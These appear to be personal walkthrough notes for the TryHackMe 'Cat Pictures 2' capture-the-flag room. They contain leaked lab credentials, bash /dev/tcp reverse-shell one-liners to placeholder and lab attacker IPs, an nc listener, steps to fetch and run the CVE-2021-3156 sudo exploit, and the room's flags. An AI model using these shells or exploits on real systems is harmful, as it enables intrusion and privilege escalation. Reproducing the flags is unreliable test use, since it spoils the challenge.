```
Now with more Cat Pictures!
```

[TryHackMe | Cat Pictures 2](https://tryhackme.com/room/catpictures2)

https://medium.com/@abylinjohnson/cat-pictures-2-tryhackme-walkthrough-51e0425184e4

![[Pasted image 20230702210735.png]]

![[Pasted image 20230702211037.png]]

![[Pasted image 20230703205316.png]]

![[Pasted image 20230703205403.png]]

![[Pasted image 20230703205530.png]]

http://10.10.113.42/#16678460194615

![[Pasted image 20230703205904.png]]
![[Pasted image 20230703210224.png]]

https://github.com/LycheeOrg/Lychee

https://github.com/wsmaxcy/Cat-Pictures-2-Writeup

http://10.10.113.42/#16678460194615/16678466730867

![[Pasted image 20230703210940.png]]

```
exiftool f5054e97620f168c7b5088c85ab1d6e4.jpg
```

![[Pasted image 20230703211310.png]]

```
http://10.10.113.42:8080/764efa883dda1e11db47671c4a3bbd9e.txt
```

![[Pasted image 20230703211957.png]]

```
note to self:

I setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.
This file isn't easy to find anyway unless you have the correct url...

gitea: port 3000
user: samarium
password: TUmhyZ37CLZrhP

ansible runner (olivetin): port 1337
```

http://10.10.113.42:3000/user/login?redirect_to=%2f

![[Pasted image 20230703212141.png]]

![[Pasted image 20230703212318.png]]

http://10.10.113.42:3000/samarium/ansible/commit/0e5c3274a60d233769fc1bfbf0d363f36ae7a944

![[Pasted image 20230703212421.png]]

http://10.10.113.42:3000/samarium/ansible/src/commit/0e5c3274a60d233769fc1bfbf0d363f36ae7a944/flag1.txt

![[Pasted image 20230703212528.png]]

```
10d916eaea54bb5ebe36b59538146bb
```

http://10.10.113.42:1337/

![[Pasted image 20230703212746.png]]

http://10.10.113.42:3000/samarium/ansible

![[Pasted image 20230703213507.png]]

http://10.10.113.42:3000/samarium/ansible/raw/branch/main/playbook.yaml

```
---
- name: Test 
  hosts: all                                  # Define all the hosts
  remote_user: bismuth                                  
  # Defining the Ansible task
  tasks:             
    - name: get the username running the deploy
      become: false
      command: whoami
      register: username_on_the_host
      changed_when: false

    - debug: var=username_on_the_host

    - name: Test
      shell: echo hi
```

```
bash -i >& /dev/tcp/<#ATTACKERIP>/<#ATTACKERPORT> 0>&1
```

```
bash -c "bash -i >& /dev/tcp/10.17.44.152/4444 0>&1"
```

```
nc -lnvp 4444
```

![[Pasted image 20230703215406.png]]

![[Pasted image 20230703215437.png]]

![[Pasted image 20230703215509.png]]

```
5e2cafbbf180351702651c09cd797920
```

https://github.com/blasty/CVE-2021-3156/blob/main/hax.c

![[Pasted image 20230703220553.png]]

```
searchsploit -m 49522
```

![[Pasted image 20230703220703.png]]

```
git clone https://github.com/blasty/CVE-2021-3156
```

```
tar -cvf exploit.tar CVE-2021-3156
```

```
python3 -m http.server
```

![[Pasted image 20230703222439.png]]

![[Pasted image 20230703222459.png]]

![[Pasted image 20230703222534.png]]

```
tar xopf exploit.tar
```

![[Pasted image 20230703222823.png]]

![[Pasted image 20230703223211.png]]

![[Pasted image 20230703223842.png]]

```
6d2a9f8f8174e86e27d565087a28a971
```

![[Pasted image 20230703223955.png]]

![[Pasted image 20230703224049.png]]




